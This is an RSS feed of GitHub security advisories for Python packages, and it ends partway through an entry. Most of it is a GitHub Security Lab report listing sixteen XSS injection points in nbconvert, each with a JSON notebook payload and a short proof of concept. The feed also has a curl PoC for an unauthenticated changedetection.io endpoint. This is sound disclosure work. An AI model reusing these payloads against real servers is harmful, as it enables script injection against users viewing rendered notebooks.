<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-01-27T07:01:13.773Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[changedetection-io] changedetection.io API endpoint is not secured with API token]]></title>
        <id>https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</id>
        <link href="https://github.com/advisories/GHSA-hcvp-2cc7-jrwr"/>
        <updated>2024-01-27T00:31:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>API endpoint <code>/api/v1/watch/&lt;uuid&gt;/history</code> can be accessed by any unauthorized user.</p>
<h3 id="details">Details</h3>
<p>WatchHistory resource does not have <code>@auth.check_token</code> annotation, which means it can be accessed without providing <code>x-api-key</code> header.</p>
<p><a href="https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Get list of watch with <code>x-api-key</code>:</li>
</ol>
<pre><code class="language-sh">$ curl -H "x-api-key: apikeyhere" http://localhost:5000/api/v1/watch
{"uuid": ...}
</code></pre>
<ol start="2">
<li>Call for history of snapshots without <code>x-api-key</code>. Expected - 401/403 error. Actual - list of snapshots is listed.</li>
</ol>
<pre><code class="language-sh">$ curl http://localhost:5000/api/v1/watch/uuid/history
{"timestamp": "/path/to/snapshot.txt"}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Anybody can check one's watch history. However, because unauthorized party first needs to know watch UUID, and the watch history endpoint itself returns only paths to the snapshot on the server, an impact on users' data privacy is minimal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-hcvp-2cc7-jrwr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23329">https://nvd.nist.gov/vuln/detail/CVE-2024-23329</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f">https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156">https://github.com/dgtlmoon/changedetection.io/blob/9510345e01ea8e308c339163d8e8b030ce5ac7f1/changedetectionio/api/api_v1.py#L129-L156</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/changedetection-io/PYSEC-2024-15.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/changedetection-io/PYSEC-2024-15.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-hcvp-2cc7-jrwr">https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hcvp-2cc7-jrwr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-01-23T12:50:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nbconvert] nbconvert vulnerable to cross-site scripting (XSS) via multiple exploit paths]]></title>
        <id>https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</id>
        <link href="https://github.com/advisories/GHSA-9jmq-rx5f-8jwq"/>
        <updated>2024-01-25T22:10:35.000Z</updated>
        <content type="html"><![CDATA[<p>Most of the fixes will be in this repo, though, so having it here gives us the private fork to work on patches</p>
<p>Below is currently a duplicate of the original report:</p>
<hr>
<p>Received on <a href="mailto:security@ipython.org">security@ipython.org</a> unedited, I'm not sure if we want to make it separate advisories. </p>
<p>Pasted raw for now, feel free to edit or make separate advisories if you have the rights to. </p>
<h2 id="i-think-the-most-important-is-to-switch-back-from-nbviewerjupyterorg---nbviewerorg-at-the-cloudflare-level-i-guess--there-might-be-fastly-involved-as-well">I think the most important is to switch back from nbviewer.jupyter.org -&gt; nbviewer.org at the cloudflare level I guess ? There might be fastly involved as well.</h2>
<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="http://example.com">example link to repo</a></li>
<li>Email us at <a href="mailto:example@example.com">example email address</a></li>
</ul>
<hr>
<h1 id="github-security-lab-ghsl-vulnerability-report">GitHub Security Lab (GHSL) Vulnerability Report</h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified potential security vulnerabilities in <a href="https://github.com/jupyter/nbconvert">nbconvert</a>.</p>
<p>We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>When using nbconvert to generate an HTML version of a user-controllable notebook, it is possible to inject arbitrary HTML which may lead to Cross-Site Scripting (XSS) vulnerabilities if these HTML notebooks are served by a web server (eg: nbviewer) </p>
<h2 id="product">Product</h2>
<p>nbconvert</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/jupyter/nbconvert/releases/tag/5.5.0">v5.5.0</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-1-xss-in-notebookmetadatalanguage_infopygments_lexer-ghsl-2021-1013">Issue 1: XSS in notebook.metadata.language_info.pygments_lexer (<code>GHSL-2021-1013</code>)</h3>
<p>Attacker in control of a notebook can inject arbitrary unescaped HTML in the <code>notebook.metadata.language_info.pygments_lexer</code> field such as the following:</p>
<pre><code class="language-json">"metadata": {
  "language_info": {
   "pygments_lexer": "ipython3-foo\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
  }
}
</code></pre>
<p>This node is read in the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/exporters/html.py#L135-L140"><code>from_notebook_node</code></a> method:</p>
<pre><code class="language-python">def from_notebook_node(self, nb, resources=None, **kw):
  langinfo = nb.metadata.get('language_info', {})
  lexer = langinfo.get('pygments_lexer', langinfo.get('name', None))
  highlight_code = self.filters.get('highlight_code', Highlight2HTML(pygments_lexer=lexer, parent=self))
  self.register_filter('highlight_code', highlight_code)
  return super().from_notebook_node(nb, resources, **kw)
</code></pre>
<p>It is then assigned to <code>language</code> var and passed down to <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L90"><code>_pygments_highlight</code></a></p>
<pre><code class="language-python">from pygments.formatters import LatexFormatter
if not language:
  language=self.pygments_lexer
latex = _pygments_highlight(source, LatexFormatter(), language, metadata)
</code></pre>
<p>In this method, the <code>language</code> variable is <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L56">concatenated to <code>highlight hl-</code> string to conform the <code>cssclass</code></a> passed to the <code>HTMLFormatter</code> constructor:</p>
<pre><code class="language-python">return _pygments_highlight(source if len(source) &gt; 0 else ' ',
  # needed to help post processors:
  HtmlFormatter(cssclass=" highlight hl-"+language),
  language, metadata)
</code></pre>
<p>The <code>cssclass</code> variable is then <a href="https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L791">concatenated in the outer div class attribute</a></p>
<pre><code class="language-python">yield 0, ('&lt;div' + (self.cssclass and ' class="%s"' % self.cssclass) + (style and (' style="%s"' % style)) + '&gt;')
</code></pre>
<p>Note that the <code>cssclass</code> variable is also used in other unsafe places such as <a href="https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L711"><code>'&lt;table class="%stable"&gt;' % self.cssclass + filename_tr +</code></a>)</p>
<h3 id="issue-2-xss-in-notebookmetadatatitle-ghsl-2021-1014">Issue 2: XSS in notebook.metadata.title (<code>GHSL-2021-1014</code>)</h3>
<p>The <code>notebook.metadata.title</code> node is rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13"><code>index.html.j2</code></a> HTML template with no escaping: </p>
<pre><code class="language-html">{% set nb_title = nb.metadata.get('title', '') or resources['metadata']['name'] %}
&lt;title&gt;{{nb_title}}&lt;/title&gt;
</code></pre>
<p>The following <code>notebook.metadata.title</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json"> "metadata": {
  "title": "TITLE&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
 }
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-3-xss-in-notebookmetadatawidgetsghsl-2021-1015">Issue 3: XSS in notebook.metadata.widgets(<code>GHSL-2021-1015</code>)</h3>
<p>The <code>notebook.metadata.widgets</code> node is rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13"><code>base.html.j2</code></a> HTML template with no escaping: </p>
<pre><code class="language-html">{% set mimetype = 'application/vnd.jupyter.widget-state+json'%}
{% if mimetype in nb.metadata.get("widgets",{})%}
&lt;script type="{{ mimetype }}"&gt;
{{ nb.metadata.widgets[mimetype] | json_dumps }}
&lt;/script&gt;
{% endif %}
</code></pre>
<p>The following <code>notebook.metadata.widgets</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json"> "metadata": {
  "widgets": {
    "application/vnd.jupyter.widget-state+json": {"foo": "pwntester&lt;/script&gt;&lt;script&gt;alert(1);//"}
  }
 }
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-4-xss-in-notebookcellmetadatatagsghsl-2021-1016">Issue 4: XSS in notebook.cell.metadata.tags(<code>GHSL-2021-1016</code>)</h3>
<p>The <code>notebook.cell.metadata.tags</code> nodes are output directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/base/celltags.j2#L4"><code>celltags.j2</code></a> HTML template with no escaping: </p>
<pre><code>{%- macro celltags(cell) -%}
    {% if cell.metadata.tags | length &gt; 0 -%}
        {% for tag in cell.metadata.tags -%}
            {{ ' celltag_' ~ tag -}}
        {%- endfor -%}
    {%- endif %}
{%- endmacro %}
</code></pre>
<p>The following <code>notebook.cell.metadata.tags</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": null,
   "id": "727d1a5f",
   "metadata": {
     "tags": ["FOO\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;div \""]
   },
   "outputs": [],
   "source": []
  }
 ],
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-5-xss-in-output-data-texthtml-cellsghsl-2021-1017">Issue 5: XSS in output data text/html cells(<code>GHSL-2021-1017</code>)</h3>
<p>Using the <code>text/html</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a cell with <code>text/html</code> output executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "b72e53fa",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
        "&lt;script&gt;alert(1)&lt;/script&gt;"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import os; os.system('touch /tmp/pwned')"
   ]
  },
</code></pre>
<h3 id="issue-6-xss-in-output-data-imagesvgxml-cellsghsl-2021-1018">Issue 6: XSS in output data image/svg+xml cells(<code>GHSL-2021-1018</code>)</h3>
<p>Using the <code>image/svg+xml</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["image/svg+xml"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{%- else %}
{{ output.data['image/svg+xml'] }}
{%- endif %}
</code></pre>
<p>The following <code>cell.output.data["image/svg+xml"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/svg+xml": ["&lt;script&gt;console.log(\"image/svg+xml output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {
     }
    }
</code></pre>
<h3 id="issue-7-xss-in-notebookcelloutputsvg_filenameghsl-2021-1019">Issue 7: XSS in notebook.cell.output.svg_filename(<code>GHSL-2021-1019</code>)</h3>
<p>The <code>cell.output.svg_filename</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{%- if output.svg_filename %}
&lt;img src="{{ output.svg_filename | posix_path }}"&gt;
</code></pre>
<p>The following <code>cell.output.svg_filename</code> node will escape the <code>img</code> tag context and execute arbitrary javascript:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b72e53fa",
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "svg_filename": "\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
     "data": {
      "image/svg+xml": [""]
     },
     "execution_count": null,
     "metadata": {
     }
    }
   ],
   "source": [""]
  },
</code></pre>
<h3 id="issue-8-xss-in-output-data-textmarkdown-cellsghsl-2021-1020">Issue 8: XSS in output data text/markdown cells(<code>GHSL-2021-1020</code>)</h3>
<p>Using the <code>text/markdown</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["text/markdown"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{{ output.data['text/markdown'] | markdown2html }}
</code></pre>
<p>The following <code>cell.output.data["text/markdown"]</code> node will execute arbitrary javascript:</p>
<pre><code>    {
     "output_type": "execute_result",
     "data": {
      "text/markdown": ["&lt;script&gt;console.log(\"text/markdown output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-9-xss-in-output-data-applicationjavascript-cellsghsl-2021-1021">Issue 9: XSS in output data application/javascript cells(<code>GHSL-2021-1021</code>)</h3>
<p>Using the <code>application/javascript</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The <code>cell.output.data["application/javascript"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>&lt;script type="text/javascript"&gt;
var element = document.getElementById('{{ div_id }}');
{{ output.data['application/javascript'] }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/javascript"]</code> node will execute arbitrary javascript:</p>
<pre><code>    {
     "output_type": "execute_result",
     "data": {
      "application/javascript": ["console.log(\"application/javascript output\")"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-10-xss-is-outputmetadatafilenames-imagepng-and-imagejpegghsl-2021-1022">Issue 10: XSS is output.metadata.filenames image/png and image/jpeg(<code>GHSL-2021-1022</code>)</h3>
<p>The <code>cell.output.metadata.filenames["images/png"]</code> and <code>cell.metadata.filenames["images/jpeg"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- if 'image/png' in output.metadata.get('filenames', {}) %}
&lt;img src="{{ output.metadata.filenames['image/png'] | posix_path }}"
</code></pre>
<p>The following <code>filenames</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": [""]
     },
     "execution_count": null,
     "metadata": {
       "filenames": {
          "image/png": "\"&gt;&lt;script&gt;console.log(\"output.metadata.filenames.image/png injection\")&lt;/script&gt;" 
       }
     }
    }
</code></pre>
<h3 id="issue-11-xss-in-output-data-imagepng-and-imagejpeg-cellsghsl-2021-1023">Issue 11: XSS in output data image/png and image/jpeg cells(<code>GHSL-2021-1023</code>)</h3>
<p>Using the <code>image/png</code> or <code>image/jpeg</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["images/png"]</code> and <code>cell.output.data["images/jpeg"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- else %}
&lt;img src="data:image/png;base64,{{ output.data['image/png'] }}"
{%- endif %}
</code></pre>
<p>The following <code>cell.output.data["image/png"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": ["\"&gt;&lt;script&gt;console.log(\"image/png output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-12-xss-is-outputmetadatawidthheight-imagepng-and-imagejpegghsl-2021-1024">Issue 12: XSS is output.metadata.width/height image/png and image/jpeg(<code>GHSL-2021-1024</code>)</h3>
<p>The <code>cell.output.metadata.width</code> and <code>cell.output.metadata.height</code> nodes of both <code>image/png</code> and <code>image/jpeg</code> cells are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- set width=output | get_metadata('width', 'image/png') -%}
width={{ width }}
{%- set height=output | get_metadata('height', 'image/png') -%}
height={{ height }}
</code></pre>
<p>The following <code>output.metadata.width</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": ["abcd"]
     },
     "execution_count": null,
     "metadata": {
        "width": "&gt;&lt;script&gt;console.log(\"output.metadata.width png injection\")&lt;/script&gt;"
     }
    }
</code></pre>
<h3 id="issue-13-xss-in-output-data-applicationvndjupyterwidget-statejson-cellsghsl-2021-1025">Issue 13: XSS in output data application/vnd.jupyter.widget-state+json cells(<code>GHSL-2021-1025</code>)</h3>
<p>The <code>cell.output.data["application/vnd.jupyter.widget-state+json"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
&lt;script type="{{ datatype }}"&gt;
{{ output.data[datatype] | json_dumps }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/vnd.jupyter.widget-state+json"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "application/vnd.jupyter.widget-state+json": "\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-state+json injection')//"
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-14-xss-in-output-data-applicationvndjupyterwidget-viewjson-cellsghsl-2021-1026">Issue 14: XSS in output data application/vnd.jupyter.widget-view+json cells(<code>GHSL-2021-1026</code>)</h3>
<p>The <code>cell.output.data["application/vnd.jupyter.widget-view+json"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
&lt;script type="{{ datatype }}"&gt;
{{ output.data[datatype] | json_dumps }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/vnd.jupyter.widget-view+json"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "application/vnd.jupyter.widget-view+json": "\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-view+json injection')//"
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-15-xss-in-raw-cellsghsl-2021-1027">Issue 15: XSS in raw cells(<code>GHSL-2021-1027</code>)</h3>
<p>Using a <code>raw</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a <code>raw</code> cell executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "raw",
   "id": "372c2bf1",
   "metadata": {},
   "source": [
    "Payload in raw cell &lt;script&gt;alert(1)&lt;/script&gt;"
   ]
  }
</code></pre>
<h3 id="issue-16-xss-in-markdown-cellsghsl-2021-1028">Issue 16: XSS in markdown cells(<code>GHSL-2021-1028</code>)</h3>
<p>Using a <code>markdown</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a <code>markdown</code> cell executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "markdown",
   "id": "2d42de4a",
   "metadata": {},
   "source": [
     "&lt;script&gt;alert(1)&lt;/script&gt;"
   ]
  },
</code></pre>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>These vulnerabilities may affect any server using nbconvert to generate HTML and not using a secure content-security-policy (CSP) policy. For example <a href="https://nbviewer.jupyter.org">nbviewer</a> is vulnerable to the above mentioned XSS issues:</p>
<ol>
<li>Create Gist with payload. eg:</li>
</ol>
<ul>
<li><code>https://gist.github.com/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>
</ul>
<ol start="2">
<li>Then load gist on nbviewer. eg:</li>
</ol>
<ul>
<li><code>https://nbviewer.jupyter.org/gist/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>
</ul>
<p>Note: response is served with <code>content-security-policy: connect-src 'none';</code></p>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>These issues were discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> in any communication regarding these issues.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq">https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32862">https://nvd.nist.gov/vuln/detail/CVE-2021-32862</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml</a></li>
<li><a href="https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm">https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/06/msg00003.html">https://lists.debian.org/debian-lts-announce/2023/06/msg00003.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9jmq-rx5f-8jwq">https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-10T17:51:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[templated_dictionary] Privilege escalation for users that can access mock configuration]]></title>
        <id>https://github.com/advisories/GHSA-7j98-74jh-cjxh</id>
        <link href="https://github.com/advisories/GHSA-7j98-74jh-cjxh"/>
        <updated>2024-01-25T21:13:03.000Z</updated>
        <content type="html"><![CDATA[<p>The Mock software contains a vulnerability wherein an attacker could potentially exploit privilege escalation, enabling the execution of arbitrary code with root user privileges. This weakness stems from the absence of proper sandboxing during the expansion and execution of Jinja2 templates, which may be included in certain configuration parameters. While the Mock documentation advises treating users added to the mock group as privileged, certain build systems invoking mock on behalf of users might inadvertently permit less privileged users to define configuration tags. These tags could then be passed as parameters to mock during execution, potentially leading to the utilization of Jinja2 templates for remote privilege escalation and the execution of arbitrary code as the root user on the build server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6395">https://nvd.nist.gov/vuln/detail/CVE-2023-6395</a></li>
<li><a href="https://github.com/xsuchy/templated-dictionary/commit/0740bd0ca8d487301881541028977d120f8b8933">https://github.com/xsuchy/templated-dictionary/commit/0740bd0ca8d487301881541028977d120f8b8933</a></li>
<li><a href="https://github.com/xsuchy/templated-dictionary/commit/bcd90f0dafa365575c4b101e6f5d98c4ef4e4b69">https://github.com/xsuchy/templated-dictionary/commit/bcd90f0dafa365575c4b101e6f5d98c4ef4e4b69</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2023-6395">https://access.redhat.com/security/cve/CVE-2023-6395</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2252206">https://bugzilla.redhat.com/show_bug.cgi?id=2252206</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/16/1">http://www.openwall.com/lists/oss-security/2024/01/16/1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/16/3">http://www.openwall.com/lists/oss-security/2024/01/16/3</a></li>
<li><a href="https://github.com/advisories/GHSA-7j98-74jh-cjxh">https://github.com/advisories/GHSA-7j98-74jh-cjxh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7j98-74jh-cjxh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-16T15:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flaskcode] Path traversal in flaskcode]]></title>
        <id>https://github.com/advisories/GHSA-v3rg-qm46-xrg9</id>
        <link href="https://github.com/advisories/GHSA-v3rg-qm46-xrg9"/>
        <updated>2024-01-24T21:53:44.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the flaskcode package through 0.0.8 for Python. An unauthenticated directory traversal, exploitable with a POST request to a /update-resource-data/ URI (from views.py), allows attackers to write to arbitrary files.</p>
<h3 id="references">References</h3>
<ul>
